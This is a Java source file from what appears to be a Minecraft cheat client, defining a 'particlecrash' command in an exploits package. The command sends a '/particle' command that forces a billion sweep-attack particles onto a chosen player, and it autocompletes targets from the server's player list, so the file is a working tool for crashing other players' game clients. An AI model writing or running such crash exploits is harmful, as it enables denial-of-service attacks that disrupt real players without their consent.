package net.onyx.client.commands.exploits;

import net.minecraft.client.network.PlayerListEntry;
import net.onyx.client.OnyxClient;
import net.onyx.client.commands.structures.Command;
import net.onyx.client.utils.ChatUtils;

import java.util.ArrayList;
import java.util.List;

public class ParticleCrash extends Command {

    public ParticleCrash() {
        super("particlecrash", "Crashes a given player using particles", "particlecrash <player>");
    }
    
    private void crashPlayer(String playerName) {
        ChatUtils.sendChatMessage(
            "/particle sweep_attack ~ ~ ~ ~ ~ ~ 40 1000000000 force " + playerName
        );
    }

    @Override
    public Boolean handleHelp(String[] args) {
        return args.length != 1;
    }

    @Override
    public Boolean trigger(String[] args) {
        if (this.handleHelp(args)) return true;

        // Get the player's name
        String playerName = args[0];

        // Crash the player
        this.crashPlayer(playerName);

        return true;
    }

    @Override
    public List<String> getSuggestions() {
        List<String> suggestions = new ArrayList<>();

        // Get the tab list
        for (PlayerListEntry entry : OnyxClient.getClient().getNetworkHandler().getPlayerList()) {
            suggestions.add(entry.getProfile().getName());
        }

        return suggestions;
    }
}
